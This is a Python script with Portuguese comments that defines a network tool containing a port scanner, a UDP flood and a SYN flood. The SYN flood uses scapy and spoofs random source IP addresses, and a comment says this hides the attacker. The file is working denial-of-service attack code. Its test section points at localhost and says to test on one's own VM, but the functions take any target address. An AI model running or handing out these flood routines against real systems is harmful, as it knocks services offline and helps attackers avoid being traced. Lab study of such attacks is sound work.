import socket
import random
import sys
import time
from scapy.all import IP, TCP, send

class NetworkTool:
    def __init__(self):
        pass

    def scan_ports(self, target_ip, ports):
        """
        Verifica se uma lista de ports está aberta num IP alvo.
        Devolve uma lista dos ports abertos.
        """
        print(f"\n[SCAN] A iniciar varrimento em {target_ip}...")
        open_ports = []
        
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            
            if result == 0:
                print(f"  [+] Port {port} ABERTO")
                open_ports.append(port)
            sock.close()
            
        return open_ports

    def udp_flood(self, target_ip, target_port, duration):
        """
        Envia pacotes UDP com dados aleatórios para o alvo durante 'duration' segundos.
        """
        print(f"\n[UDP FLOOD] A atacar {target_ip}:{target_port} durante {duration}s...")
        
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = random._urandom(1024)
        timeout = time.time() + duration
        sent_packets = 0

        while time.time() < timeout:
            try:
                client.sendto(bytes_to_send, (target_ip, target_port))
                sent_packets += 1
            except KeyboardInterrupt:
                print("\n[!] Ataque interrompido pelo utilizador.")
                break
            except Exception as e:
                print(f"[ERRO] {e}")
                break
        
        print(f"[FIM] UDP Flood terminado. Pacotes enviados: {sent_packets}")

    def syn_flood(self, target_ip, target_port, count):
        """
        Envia pacotes TCP com a flag SYN ativa (início de conexão) sem completar o handshake.
        Requer permissões de ROOT/ADMIN.
        """
        print(f"\n[SYN FLOOD] A enviar {count} pacotes SYN para {target_ip}:{target_port}...")
        
        for i in range(count):
            # IP Spoofing: Cria um IP de origem falso para esconder o atacante
            src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            src_port = random.randint(1024, 65535)
            
            # Construção do pacote: Camada IP + Camada TCP (Flag S = SYN)
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
            packet = ip_layer / tcp_layer
            
            # Enviar sem esperar resposta (verbose=0 silencia o output do scapy)
            send(packet, verbose=0)

        print(f"[FIM] {count} pacotes SYN enviados.")

# Teste
if __name__ == "__main__":
    tool = NetworkTool()
    
    # ATENÇÃO: Usar o IP da própria VM ou 127.0.0.1 para testes
    alvo = "127.0.0.1" 
    
    # 1. Teste Scanner (Portos comuns)
    # tool.scan_ports(alvo, [21, 22, 80, 443, 3306, 8080])
    
    # 2. Teste UDP (5 segundos)
    # tool.udp_flood(alvo, 8080, 5)
    
    # 3. Teste SYN (Requer sudo)
    # tool.syn_flood(alvo, 80, 100)
